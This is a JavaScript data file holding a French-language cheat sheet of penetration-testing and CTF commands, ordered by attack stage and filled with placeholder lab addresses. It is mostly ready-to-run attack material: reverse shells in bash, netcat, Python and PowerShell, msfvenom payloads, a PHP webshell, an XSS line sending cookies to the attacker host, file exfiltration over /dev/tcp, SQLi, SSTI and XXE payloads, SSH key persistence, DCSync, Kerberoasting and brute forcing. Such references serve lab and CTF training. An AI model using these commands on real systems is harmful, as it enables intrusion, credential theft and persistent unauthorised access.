/* Cheatsheet : l'essentiel, rangé dans l'ordre d'un test d'intrusion, puis les outils de CTF.
   Format : [catégorie, titre (« outil — action »), commande, mots-clés]
   Variables remplacées à la volée : {RHOST} {RPORT} {LHOST} {LPORT} {URL} {DOMAIN} {USER} {PASS} {WORDLIST} {FILE} {HASH} */
"use strict";

window.CHEAT_VARS = {
  RHOST: "10.10.10.10", RPORT: "80", LHOST: "10.10.14.1", LPORT: "4444",
  URL: "http://target.htb", DOMAIN: "target.htb", USER: "admin", PASS: "password",
  WORDLIST: "/usr/share/wordlists/rockyou.txt", FILE: "chall", HASH: "hash.txt",
};

/* Ordre = ordre d'affichage. Les numéros suivent les étapes d'un pentest. */
window.CHEAT_CATS = {
  "1 · Reconnaissance": "#22d3ee",
  "2 · Énum. services": "#38bdf8",
  "3 · Énum. web": "#60a5fa",
  "4 · Exploitation web": "#818cf8",
  "5 · Accès & reverse shell": "#f87171",
  "6 · Stabiliser le shell": "#fb7185",
  "7 · Transfert de fichiers": "#a78bfa",
  "8 · Privesc Linux": "#fb923c",
  "9 · Privesc Windows": "#f59e0b",
  "10 · Active Directory": "#eab308",
  "11 · Pivoting": "#2dd4bf",
  "12 · Mots de passe": "#f472b6",
  "CTF · Pwn": "#ef4444",
  "CTF · Reverse": "#c084fc",
  "CTF · Forensics": "#34d399",
  "CTF · Stégano": "#e879f9",
  "CTF · Crypto": "#fbbf24",
};

const CS_SL = "/usr/share/seclists";

window.CHEATSHEET = [
  // ============ 1 · Reconnaissance : quelles machines, quels ports ? ============
  ["1 · Reconnaissance", "nmap — tous les ports TCP (rapide)", "nmap -p- --min-rate 5000 -Pn -oN allports.txt {RHOST}", "scan ports"],
  ["1 · Reconnaissance", "nmap — versions + scripts sur les ports trouvés", "nmap -sC -sV -Pn -p 22,80,445 -oN services.txt {RHOST}", "version"],
  ["1 · Reconnaissance", "nmap — top 100 UDP", "sudo nmap -sU --top-ports 100 {RHOST}", "udp snmp"],
  ["1 · Reconnaissance", "nmap — hôtes vivants du réseau", "nmap -sn 10.10.10.0/24", "ping sweep"],
  ["1 · Reconnaissance", "Ajouter le domaine à /etc/hosts", "echo '{RHOST} {DOMAIN}' | sudo tee -a /etc/hosts", "vhost dns"],
  ["1 · Reconnaissance", "searchsploit — exploit pour une version", "searchsploit apache 2.4.49", "cve exploitdb"],

  // ============ 2 · Énumération des services ============
  ["2 · Énum. services", "SMB — partages (anonyme)", "smbclient -N -L //{RHOST}/\nnetexec smb {RHOST} -u '' -p '' --shares", "samba nxc"],
  ["2 · Énum. services", "SMB — énumération complète", "enum4linux-ng -A {RHOST}", "users samba"],
  ["2 · Énum. services", "FTP — connexion anonyme", "ftp anonymous@{RHOST}", "ftp 21"],
  ["2 · Énum. services", "SSH — version et méthodes d'authentification", "nmap -p 22 -sV --script ssh-auth-methods,ssh2-enum-algos {RHOST}", "ssh 22"],
  ["2 · Énum. services", "SNMP — lire les infos", "snmpwalk -v2c -c public {RHOST}", "udp 161"],
  ["2 · Énum. services", "LDAP — infos anonymes", "ldapsearch -x -H ldap://{RHOST} -s base namingcontexts", "ldap ad"],
  ["2 · Énum. services", "NFS — partages exportés", "showmount -e {RHOST}\nsudo mount -t nfs {RHOST}:/partage /mnt", "nfs 2049"],
  ["2 · Énum. services", "DNS — transfert de zone", "dig axfr {DOMAIN} @{RHOST}", "axfr 53"],

  // ============ 3 · Énumération web ============
  ["3 · Énum. web", "whatweb — technologies du site", "whatweb -a 3 {URL}", "fingerprint"],
  ["3 · Énum. web", "ffuf — répertoires", `ffuf -u {URL}/FUZZ -w ${CS_SL}/Discovery/Web-Content/raft-medium-directories.txt -ic -fc 404`, "dirbusting"],
  ["3 · Énum. web", "ffuf — fichiers + extensions", `ffuf -u {URL}/FUZZ -w ${CS_SL}/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak -ic`, "backup"],
  ["3 · Énum. web", "ffuf — sous-domaines (vhosts)", `ffuf -u {URL} -H 'Host: FUZZ.{DOMAIN}' -w ${CS_SL}/Discovery/DNS/subdomains-top1million-5000.txt -ac`, "subdomain"],
  ["3 · Énum. web", "ffuf — paramètres GET", `ffuf -u '{URL}/index.php?FUZZ=test' -w ${CS_SL}/Discovery/Web-Content/burp-parameter-names.txt -ac`, "param"],
  ["3 · Énum. web", "gobuster — répertoires et fichiers", `gobuster dir -u {URL} -w ${CS_SL}/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,bak -t 50`, "dirbusting"],
  ["3 · Énum. web", "gobuster — sous-domaines (vhosts)", `gobuster vhost -u {URL} -w ${CS_SL}/Discovery/DNS/subdomains-top1million-5000.txt --append-domain`, "subdomain vhost"],
  ["3 · Énum. web", "git-dumper — dépôt .git exposé", "git-dumper {URL}/.git ./repo", "source leak"],
  ["3 · Énum. web", "wpscan — WordPress", "wpscan --url {URL} -e ap,u", "cms wp"],

  // ============ 4 · Exploitation web ============
  ["4 · Exploitation web", "sqlmap — depuis une requête Burp", "sqlmap -r req.txt --batch --dbs\nsqlmap -r req.txt --batch -D db -T users --dump", "sqli"],
  ["4 · Exploitation web", "SQLi — contourner un login", "' OR 1=1-- -", "sqli auth"],
  ["4 · Exploitation web", "SQLi — UNION", "' ORDER BY 3-- -\n' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -", "sqli union"],
  ["4 · Exploitation web", "LFI — lire un fichier / le code PHP", "{URL}/index.php?page=../../../../etc/passwd\n{URL}/index.php?page=php://filter/convert.base64-encode/resource=index.php", "inclusion traversal"],
  ["4 · Exploitation web", "Injection de commande — séparateurs", "; id\n| id\n$(id)\n`id`\n%0aid", "rce"],
  ["4 · Exploitation web", "SSTI — détecter puis RCE (Jinja2)", "{{7*7}} ${7*7} <%= 7*7 %>\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}", "template flask"],
  ["4 · Exploitation web", "Upload — webshell + contournements", "<?php system($_GET['cmd']); ?>\n# extensions : shell.phtml  shell.php5  shell.pHp  shell.php.jpg", "upload rce"],
  ["4 · Exploitation web", "XSS — voler un cookie", "<script>fetch('http://{LHOST}:{LPORT}/?c='+document.cookie)</script>", "xss exfil"],
  ["4 · Exploitation web", "XXE — lire un fichier", "<?xml version=\"1.0\"?>\n<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>", "xml"],
  ["4 · Exploitation web", "JWT — cracker le secret", "hashcat -m 16500 jwt.txt {WORDLIST}", "token"],

  // ============ 5 · Accès & reverse shell ============
  ["5 · Accès & reverse shell", "SSH — se connecter (mot de passe ou clé)", "ssh {USER}@{RHOST}\nchmod 600 id_rsa && ssh -i id_rsa {USER}@{RHOST}", "ssh 22"],
  ["5 · Accès & reverse shell", "SSH — vieux serveur (algorithmes refusés)", "ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa {USER}@{RHOST}", "ssh rsa legacy"],
  ["5 · Accès & reverse shell", "Écouteur", "rlwrap -cAr nc -lvnp {LPORT}", "listener nc"],
  ["5 · Accès & reverse shell", "Bash", "bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'", "revshell"],
  ["5 · Accès & reverse shell", "Netcat (mkfifo, sans -e)", "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f", "nc"],
  ["5 · Accès & reverse shell", "Python", "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'", "revshell"],
  ["5 · Accès & reverse shell", "PowerShell", "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"", "windows"],
  ["5 · Accès & reverse shell", "msfvenom — binaire Linux / Windows", "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe", "payload"],

  // ============ 6 · Stabiliser le shell ============
  ["6 · Stabiliser le shell", "TTY complet (python + stty)", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z, puis :\nstty raw -echo; fg\nexport TERM=xterm; stty rows 40 cols 160", "upgrade"],
  ["6 · Stabiliser le shell", "TTY sans python", "script -qc /bin/bash /dev/null", "upgrade"],

  // ============ 7 · Transfert de fichiers ============
  ["7 · Transfert de fichiers", "Servir des fichiers (attaquant)", "python3 -m http.server 8000", "http"],
  ["7 · Transfert de fichiers", "Télécharger sur Linux", "wget http://{LHOST}:8000/{FILE} -O /tmp/{FILE}\ncurl http://{LHOST}:8000/{FILE} -o /tmp/{FILE}", "download"],
  ["7 · Transfert de fichiers", "Télécharger sur Windows", "iwr http://{LHOST}:8000/{FILE} -OutFile C:\\Windows\\Temp\\{FILE}\ncertutil -urlcache -f http://{LHOST}:8000/{FILE} {FILE}", "download"],
  ["7 · Transfert de fichiers", "Partage SMB (vers Windows)", "impacket-smbserver share . -smb2support\n# cible : copy \\\\{LHOST}\\share\\{FILE} .", "smb"],
  ["7 · Transfert de fichiers", "scp — copier via SSH", "scp {FILE} {USER}@{RHOST}:/tmp/          # vers la cible\nscp {USER}@{RHOST}:/chemin/{FILE} .      # depuis la cible", "ssh"],
  ["7 · Transfert de fichiers", "Récupérer un fichier de la cible", "# attaquant :\nnc -lvnp {LPORT} > {FILE}\n# cible :\ncat {FILE} > /dev/tcp/{LHOST}/{LPORT}", "exfil"],

  // ============ 8 · Privesc Linux ============
  ["8 · Privesc Linux", "LinPEAS — tout vérifier", "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh", "enum auto"],
  ["8 · Privesc Linux", "sudo -l (puis GTFOBins)", "sudo -l", "sudoers gtfobins"],
  ["8 · Privesc Linux", "SUID et capabilities", "find / -perm -4000 -type f 2>/dev/null\ngetcap -r / 2>/dev/null", "suid gtfobins"],
  ["8 · Privesc Linux", "Tâches planifiées", "cat /etc/crontab; ls -la /etc/cron.*\n./pspy64   # voir ce qui s'exécute", "cron pspy"],
  ["8 · Privesc Linux", "Services internes", "ss -tulpn", "ports locaux"],
  ["8 · Privesc Linux", "Chercher des mots de passe", "grep -rniE 'pass(word)?|secret|api_key' /var/www /opt /home 2>/dev/null | head -50", "credentials"],
  ["8 · Privesc Linux", "Groupe docker → root", "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "docker lxd"],
  ["8 · Privesc Linux", "SSH — clés privées et persistance", "find / -name id_rsa -o -name id_ed25519 2>/dev/null\n# poser ma clé : ssh-keygen -t ed25519 -f ./key -N ''\necho '<contenu de key.pub>' >> ~/.ssh/authorized_keys", "ssh key"],

  // ============ 9 · Privesc Windows ============
  ["9 · Privesc Windows", "WinPEAS — tout vérifier", ".\\winPEASx64.exe", "enum auto"],
  ["9 · Privesc Windows", "Privilèges de l'utilisateur", "whoami /all", "token"],
  ["9 · Privesc Windows", "SeImpersonate → SYSTEM", ".\\GodPotato.exe -cmd \"cmd /c whoami\"", "potato"],
  ["9 · Privesc Windows", "Mots de passe enregistrés", "cmdkey /list\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", "credentials historique"],
  ["9 · Privesc Windows", "Services avec chemin non quoté", "Get-CimInstance win32_service | ?{$_.PathName -notmatch '^\"' -and $_.PathName -match ' '} | select Name,PathName", "unquoted"],

  // ============ 10 · Active Directory ============
  ["10 · Active Directory", "netexec — tester des identifiants", "netexec smb {RHOST} -u {USER} -p '{PASS}'\nnetexec winrm {RHOST} -u {USER} -p '{PASS}'", "nxc"],
  ["10 · Active Directory", "kerbrute — utilisateurs valides", "kerbrute userenum -d {DOMAIN} --dc {RHOST} users.txt", "kerberos"],
  ["10 · Active Directory", "AS-REP Roasting", "impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {RHOST} -no-pass -format hashcat", "kerberos"],
  ["10 · Active Directory", "Kerberoasting", "impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {RHOST} -request", "kerberos spn"],
  ["10 · Active Directory", "BloodHound — collecte", "bloodhound-python -u {USER} -p '{PASS}' -d {DOMAIN} -ns {RHOST} -c All --zip", "graph"],
  ["10 · Active Directory", "evil-winrm — shell (mot de passe ou hash)", "evil-winrm -i {RHOST} -u {USER} -p '{PASS}'\nevil-winrm -i {RHOST} -u Administrator -H <NTHASH>", "pth"],
  ["10 · Active Directory", "secretsdump — DCSync", "impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{RHOST}", "ntds hash"],

  // ============ 11 · Pivoting ============
  ["11 · Pivoting", "SSH — redirection de port", "ssh -L 8080:127.0.0.1:80 {USER}@{RHOST}   # local\nssh -D 1080 -N {USER}@{RHOST}            # SOCKS", "tunnel"],
  ["11 · Pivoting", "chisel — SOCKS inversé", "# attaquant :\nchisel server -p 8000 --reverse\n# cible :\n./chisel client {LHOST}:8000 R:socks", "tunnel socks"],
  ["11 · Pivoting", "proxychains — passer par le tunnel", "proxychains -q nmap -sT -Pn -p 80,445 172.16.0.10", "socks"],
  ["11 · Pivoting", "ligolo-ng — proxy", "sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601", "tunnel"],

  // ============ 12 · Mots de passe ============
  ["12 · Mots de passe", "Identifier un hash", "nth --text '<hash>'   # ou : hashid -m '<hash>'", "type"],
  ["12 · Mots de passe", "hashcat — modes courants", "hashcat -m <mode> {HASH} {WORDLIST}\n# 0 MD5 · 100 SHA1 · 1400 SHA256 · 1000 NTLM · 1800 $6$ · 3200 bcrypt\n# 13100 kerberoast · 18200 asrep · 16500 JWT", "crack"],
  ["12 · Mots de passe", "john — wordlist", "john --wordlist={WORDLIST} {HASH}\njohn --show {HASH}", "crack"],
  ["12 · Mots de passe", "ZIP / clé SSH protégés", "zip2john {FILE}.zip > h && john --wordlist={WORDLIST} h\nssh2john id_rsa > h && john --wordlist={WORDLIST} h", "archive passphrase"],
  ["12 · Mots de passe", "hydra — SSH / formulaire web", "hydra -l {USER} -P {WORDLIST} ssh://{RHOST} -t 4\nhydra -l {USER} -P {WORDLIST} {RHOST} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'", "bruteforce"],

  // ============ CTF · Pwn ============
  ["CTF · Pwn", "checksec — protections", "checksec --file={FILE}", "nx pie canary"],
  ["CTF · Pwn", "Offset de débordement", "pwn cyclic 200\npwn cyclic -l 0x6161616c", "bof rip"],
  ["CTF · Pwn", "ROPgadget — gadgets", "ROPgadget --binary {FILE} | grep 'pop rdi'", "rop"],
  ["CTF · Pwn", "pwntools — squelette", "from pwn import *\n\nelf = context.binary = ELF('./{FILE}')\np = remote('{RHOST}', {RPORT})   # ou process(elf.path)\n\npayload = flat(b'A' * 40, elf.sym.win)\np.sendline(payload)\np.interactive()", "exploit"],
  ["CTF · Pwn", "Format string — fuite de la pile", "%p.%p.%p.%p.%p.%p.%p.%p", "fmt"],

  // ============ CTF · Reverse ============
  ["CTF · Reverse", "Premier coup d'œil", "file {FILE}\nstrings -n 6 {FILE} | grep -iE 'flag|ctf|\\{'", "strings"],
  ["CTF · Reverse", "Tracer à l'exécution", "ltrace ./{FILE}   # strcmp & co\nstrace -f ./{FILE}", "dynamique"],
  ["CTF · Reverse", "Désassembler / décompiler", "r2 -A {FILE}   # afl, s main, pdf\nghidra        # ou IDA / Binary Ninja", "asm"],
  ["CTF · Reverse", "Décompiler Python / Java / .NET", "pycdc {FILE}.pyc\njadx-gui {FILE}.jar   # aussi les .apk\nilspycmd {FILE}.exe", "bytecode"],
  ["CTF · Reverse", "UPX — dépaqueter", "upx -d {FILE}", "packer"],

  // ============ CTF · Forensics ============
  ["CTF · Forensics", "Métadonnées et fichiers cachés", "exiftool {FILE}\nbinwalk -e {FILE}", "exif carving"],
  ["CTF · Forensics", "Vue hexadécimale", "xxd {FILE} | head -40", "magic bytes"],
  ["CTF · Forensics", "PCAP — vue d'ensemble et fichiers", "tshark -r capture.pcap -qz io,phs\ntshark -r capture.pcap --export-objects http,out/", "wireshark"],
  ["CTF · Forensics", "PCAP — suivre un flux TCP", "tshark -r capture.pcap -qz follow,tcp,ascii,0", "stream"],
  ["CTF · Forensics", "Volatility 3 — mémoire", "vol -f mem.raw windows.pslist\nvol -f mem.raw windows.filescan | grep -i flag\nvol -f mem.raw windows.hashdump", "ram dump"],

  // ============ CTF · Stégano ============
  ["CTF · Stégano", "Images PNG/BMP (LSB)", "zsteg -a {FILE}.png", "lsb"],
  ["CTF · Stégano", "JPG — steghide / bruteforce", "steghide extract -sf {FILE}.jpg -p ''\nstegseek {FILE}.jpg {WORDLIST}", "jpg"],
  ["CTF · Stégano", "Audio — spectrogramme", "sox {FILE}.wav -n spectrogram -o spec.png", "son"],

  // ============ CTF · Crypto ============
  ["CTF · Crypto", "Décodages rapides", "echo '<b64>' | base64 -d\necho '666c6167' | xxd -r -p", "encodage"],
  ["CTF · Crypto", "RsaCtfTool — attaques RSA", "RsaCtfTool --publickey key.pub --private", "rsa"],
  ["CTF · Crypto", "RSA — déchiffrer avec p et q", "from Crypto.Util.number import inverse, long_to_bytes\nd = inverse(e, (p-1)*(q-1))\nprint(long_to_bytes(pow(c, d, p*q)))", "rsa python"],
  ["CTF · Crypto", "XOR en Python", "from pwn import xor\nprint(xor(bytes.fromhex('...'), b'key'))", "xor"],
];
